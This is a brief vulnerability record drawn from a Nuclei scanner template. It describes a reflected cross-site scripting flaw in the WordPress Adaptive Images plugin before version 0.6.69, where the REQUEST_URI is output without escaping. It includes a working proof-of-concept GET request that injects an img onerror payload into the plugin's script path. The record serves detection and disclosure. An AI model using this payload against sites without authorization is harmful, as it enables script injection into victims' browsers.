# Vulnerability: WordPress Adaptive Images < 0.6.69 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wp-adaptive-xss.yaml`)

## Description
WordPress Adaptive Images < 0.6.69 is susceptible to cross-site scripting because the plugin does not sanitize and escape the REQUEST_URI before outputting it back in a page.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true
```

